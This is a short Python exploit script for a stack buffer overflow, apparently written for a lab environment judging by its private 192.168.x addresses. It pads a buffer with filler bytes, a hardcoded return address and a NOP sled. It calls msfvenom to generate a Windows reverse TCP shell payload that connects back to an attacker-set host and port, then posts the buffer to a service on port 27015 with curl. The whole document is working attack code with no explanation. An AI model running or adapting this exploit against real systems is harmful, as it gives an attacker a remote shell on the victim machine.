import os


prefix = ""
offset = 9
overflow = "A" * offset
retn = "\x77\x70\x14\x63"[::-1]
padding = "\x90"*10 #+ "\xcc"
postfix = ""

### Payload Generation ##############################################
LHOST="192.168.1.92"
LPORT="8888"

#LHOST="192.168.49.234"
#LPORT="443"
command = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" EXITFUNC=thread  -b 'x00' -f py -o msfpayload.py"
os.system(command)
import msfpayload
payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
#######################################################################

buffer = prefix + overflow + retn + padding + payload + postfix
print(len(buffer))
print([buffer])
data = buffer


URL = 'http://192.168.1.92:27015'
#URL = 'http://192.168.234.150:27015'
with open("/tmp/payload", "w")  as f:
    f.write(data)
os.system('curl '+URL+' --data-binary "@/tmp/payload"')

